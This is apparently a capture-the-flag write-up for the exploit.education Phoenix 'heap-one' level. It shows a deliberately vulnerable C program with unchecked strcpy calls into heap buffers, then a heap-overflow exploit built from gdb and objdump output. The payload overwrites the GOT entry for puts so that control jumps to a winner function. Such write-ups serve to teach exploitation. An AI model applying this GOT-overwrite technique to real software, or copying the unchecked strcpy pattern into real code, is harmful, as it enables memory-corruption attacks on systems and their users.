# HEAP ONE


## SOURCE CODE

```c
/*
 * phoenix/heap-zero, by https://exploit.education
 *
 * Can you hijack flow control?
 *
 * Which vegetable did Noah leave off the Ark?
 * Leeks
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

struct heapStructure {
  int priority;
  char *name;
};

int main(int argc, char **argv) {
  struct heapStructure *i1, *i2;

  i1 = malloc(sizeof(struct heapStructure));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct heapStructure));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}

void winner() {
  printf(
      "Congratulations, you've completed this level @ %ld seconds past the "
      "Epoch\n",
      time(NULL));
}

```


## STRATEGY
The goal is execute *`winner`* function. To do that we have to use the *`strcpy`*. The *`strcpy`* takes a pointer and a string as parameters. Then write the string in the memory area pointed by the pointer. The two *`i1`* *`i2`* structures are allocated sequentially, so we can generate a heap overflow. We have to use the first *`strcpy`* to overwrite *`i2`* pointer with the address of GOT containing *`puts`*. With the second *`strcpy`* we have to write the address of the *`winner`* function in the GOT. When *`printf`* will be called the code will jump in *`winner`* function


## EXPLOIT
We can get *`winner`* address with objdump:
```shell
user@phoenix-amd64:/opt/phoenix/i486$ objdump -d heap-one | grep winner
0804889a <winner>:
```
address: 0x0804889a


```shell
Then with a *`pattern`* we can obtain the distance between *`i1->name`* and *`i2`*
user@phoenix-amd64:/opt/phoenix/i486$ ./heap-one `python -c 'import struct; print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab" + " " + "KEBAB"'`
Segmentation fault
user@phoenix-amd64:/opt/phoenix/i486$ sudo dmesg |tail -n1
[sudo] password for user: 
[ 8012.868980] heap-one[395]: segfault at 37614136 ip 00000000f7f840db sp 00000000ffffd5b4 error 6 in libc.so[f7f6d000+8d000]
```
Number of bytes to fill before *`i2`*: 20


Last thing we need is GOT address with *`puts`*, so disassembling *`main`*:
```gdb
(gdb) disas main
Dump of assembler code for function main:
   ...
   ...
   ...
   0x08048878 <+163>:	add    esp,0x10
   0x0804887b <+166>:	sub    esp,0xc
   0x0804887e <+169>:	push   0x804ab70
   0x08048883 <+174>:	call   0x80485b0 <puts@plt>
   0x08048888 <+179>:	add    esp,0x10
   0x0804888b <+182>:	mov    eax,0x0
   0x08048890 <+187>:	lea    esp,[ebp-0x8]
   0x08048893 <+190>:	pop    ecx
   ...
   ...
   ...
```

disassembling plt at  0x80485b0

```gdb
(gdb) disas 0x80485b0
Dump of assembler code for function puts@plt:
   0x080485b0 <+0>:	jmp    DWORD PTR ds:0x804c140
   0x080485b6 <+6>:	push   0x28
   0x080485bb <+11>:	jmp    0x8048550
End of assembler dump.
```

*`puts`* address inside the GOT: 0x804c140

```gdb
During runtime:	
(gdb) x 0x804c140
0x804c140 <puts@got.plt>:	0xf7fb88ee
```


Exploit:
```python
./heap-one `python -c 'import struct; print "A"*20 + struct.pack("I", 0x804c140) + " " + struct.pack("I", 0x0804889a)'`
```
